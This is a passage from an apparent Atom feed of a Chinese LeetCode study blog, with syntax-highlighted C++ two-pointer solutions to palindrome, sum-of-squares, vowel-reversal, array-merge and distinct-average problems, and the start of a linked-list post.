class="keyword">else</span> <span class="keyword">if</span>(sum&gt;target)</span><br><span class="line">                j--;</span><br><span class="line">            <span class="keyword">else</span>   </span><br><span class="line">                <span class="keyword">return</span> vector&lt;<span class="keyword">int</span>&gt;&#123;i+<span class="number">1</span>,j+<span class="number">1</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="keyword">int</span>&gt;&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="633-平方数之和"><a href="#633-平方数之和" class="headerlink" title="633 平方数之和"></a>633 平方数之和</h3><p>给定一个非负整数 c ，你要判断是否存在两个整数 a 和 b，使得 a^2 + b^2 = c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    sqrt()函数：开方</span></span><br><span class="line"><span class="comment">    O(根号c)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">long</span> a=<span class="number">0</span>;a*a&lt;=c;a++)&#123;</span><br><span class="line">            <span class="keyword">double</span> b = <span class="built_in">sqrt</span>(c-a*a);</span><br><span class="line">            <span class="keyword">if</span>(b == (<span class="keyword">int</span>)b)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">     O(根号c)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> right = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(c);</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">long</span> sum = left*left+right*right;</span><br><span class="line">            <span class="keyword">if</span>(sum==c)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;c)</span><br><span class="line">                right--;</span><br><span class="line">            <span class="keyword">else</span>   </span><br><span class="line">                left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="345-反转字符串中的元音字母"><a href="#345-反转字符串中的元音字母" class="headerlink" title="345 反转字符串中的元音字母"></a>345 反转字符串中的元音字母</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    输入：s = &quot;leetcode&quot;</span></span><br><span class="line"><span class="comment">    输出：&quot;leotcede&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseVowels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> isVowel = [vowels = <span class="string">&quot;aeiouAEIOU&quot;</span>s](<span class="keyword">char</span> ch) &#123;</span><br><span class="line">            <span class="keyword">return</span> vowels.<span class="built_in">find</span>(ch) != string::npos;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; !<span class="built_in">isVowel</span>(s[i])) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; !<span class="built_in">isVowel</span>(s[j])) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">                i++;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="125-验证回文串"><a href="#125-验证回文串" class="headerlink" title="125 验证回文串"></a>125 验证回文串</h3><p><strong>回文串：</strong> 如果在将所有大写字符转换为小写字符、并移除所有非字母数字字符之后，短语正着读和反着读都一样。则可以认为该短语是一个。【回文串包括：字母，数字】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string str;</span><br><span class="line">        <span class="comment">//isalnum()是否全为字母或者数字[十进制]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalnum</span>(ch))&#123;</span><br><span class="line">                <span class="comment">//tolower()将字母字符转换为 小写</span></span><br><span class="line">                <span class="comment">//toupper()转大写</span></span><br><span class="line">                str += <span class="built_in">tolower</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> n=str.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[left] != str[right])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    原串上直接判断O(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>;<span class="comment">//双指针</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; !<span class="built_in">isalnum</span>(s[left])) &#123;</span><br><span class="line">                ++left;<span class="comment">//非字母或者数字，跳过</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; !<span class="built_in">isalnum</span>(s[right])) &#123;</span><br><span class="line">                --right;<span class="comment">//非字母或者数字，跳过</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">tolower</span>(s[left]) != <span class="built_in">tolower</span>(s[right])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ++left;</span><br><span class="line">                --right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    字符串反转：反转之后与原串相同 则是回文串</span></span><br><span class="line"><span class="comment">    string str_reverse(str.rbegin(),str.rend());</span></span><br><span class="line"><span class="comment">    reverse(str.begin(),str.end());</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string str;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isalnum</span>(ch))&#123;</span><br><span class="line">                str += <span class="built_in">tolower</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//字符串反转</span></span><br><span class="line">        <span class="function">string <span class="title">str_reverse</span><span class="params">(str.rbegin(),str.rend())</span></span>;</span><br><span class="line">        <span class="keyword">return</span> str==str_reverse;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="680-验证回文串-II"><a href="#680-验证回文串-II" class="headerlink" title="680 验证回文串 II"></a>680 验证回文串 II</h3><p>给你一个字符串 s，<strong>最多 可以从中删除一个字符</strong>。<br>请你判断 s 是否能成为回文字符串：如果能，返回 true ；否则，返回 false </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">    return check(s,low,high-1)||check(s,low+1,high);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">const</span> string &amp;s,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=low,j=high;i&lt;j;i++,j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]!=s[j])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">validPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low=<span class="number">0</span>,high=s.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">            <span class="keyword">char</span> c1=s[low],c2=s[high];</span><br><span class="line">            <span class="keyword">if</span>(c1==c2)&#123;</span><br><span class="line">                low++;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">check</span>(s,low,high<span class="number">-1</span>)||<span class="built_in">check</span>(s,low+<span class="number">1</span>,high);<span class="comment">//减1 尝试</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="88-合并两个有序数组——升序"><a href="#88-合并两个有序数组——升序" class="headerlink" title="88 合并两个有序数组——升序"></a>88 合并两个有序数组——升序</h3><p>合并两个 <strong>升序</strong> 数组，最后放于 num1数组中，其初始长度是m+n</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    直接合并 之后 再排序O((m+n)log(m+n))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            nums1[m+i] = nums2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums1.<span class="built_in">begin</span>(),nums1.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针O(m+n)    </span></span><br><span class="line"><span class="comment">    额外空间int sorted[m+n]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1=<span class="number">0</span>,p2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sorted[m+n];</span><br><span class="line">        <span class="keyword">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span>(p1&lt;m || p2&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1==m)</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(p2==n)</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums1[p1] &lt; nums2[p2])</span><br><span class="line">                cur = nums1[p1++]; <span class="comment">//取两个数组中 头部较小的那个</span></span><br><span class="line">            <span class="keyword">else</span>    </span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            sorted[p1+p2<span class="number">-1</span>] = cur;<span class="comment">//p1+p2-1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m+n;i++)</span><br><span class="line">            nums1[i] = sorted[i];<span class="comment">//再 赋给nums1数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    逆向双指针O(m+n)</span></span><br><span class="line"><span class="comment">    不用额外空间 sorted[]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1=m<span class="number">-1</span>,p2=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> tail = m+n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span>(p1&gt;=<span class="number">0</span> || p2&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1==<span class="number">-1</span>)</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(p2==<span class="number">-1</span>)</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums1[p1] &gt; nums2[p2])</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            nums1[tail--] = cur;<span class="comment">//逆向 赋值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2465-不同的平均值数目"><a href="#2465-不同的平均值数目" class="headerlink" title="2465 不同的平均值数目"></a>2465 不同的平均值数目</h3><p>长度为 偶数 的整数数组 nums 。<br>只要 nums 不是 空数组，你就重复执行以下步骤：</p><pre><code>找到 nums 中的最小值，并删除它。找到 nums 中的最大值，并删除它。计算删除两数的平均值。</code></pre><p>两数 a 和 b 的 平均值 为 (a + b) / 2 。<br><strong>返回得到的 不同 平均值的数目</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    排序+哈希表</span></span><br><span class="line"><span class="comment">    双指针、「不同平均值的数目」和「不同和的数目」是等价的</span></span><br><span class="line"><span class="comment">    避免浮点运算</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">distinctAverages</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//升序排序</span></span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; ans;<span class="comment">//不重复</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, j=nums.<span class="built_in">size</span>()<span class="number">-1</span>; i&lt;j; i++,j--)&#123;</span><br><span class="line">            ans.<span class="built_in">insert</span>(nums[i]+nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.<span class="built_in">size</span>();<span class="comment">//返回 set大小即可</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>一、链表</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E4%B8%80%E3%80%81%E9%93%BE%E8%A1%A8/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E4%B8%80%E3%80%81%E9%93%BE%E8%A1%A8/</id>
    <published>2025-12-03T05:27:50.000Z</published>
    <updated>2025-12-03T05:29:04.350Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、链表"><a href="#一、链表" class="headerlink" title="一、链表"></a>一、链表</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="keyword">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">next</span>(<span class="literal">NULL</span>)&#123;&#125;<span class="comment">//构造函数</span></span><br><span class="line">&#125;</span><br><span class="line">通过自己定义构造函数初始化节点：</span><br><span class="line">ListNode* head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">使用默认构造函数初始化节点：</span><br><span class="line">ListNode* head = <span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">head-&gt;val = <span class="number">5</span>;</span><br></pre></td></tr></table></figure><h3 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707 设计链表"></a>707 设计链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList</span> &#123;</span></span><br><span class="line"><span 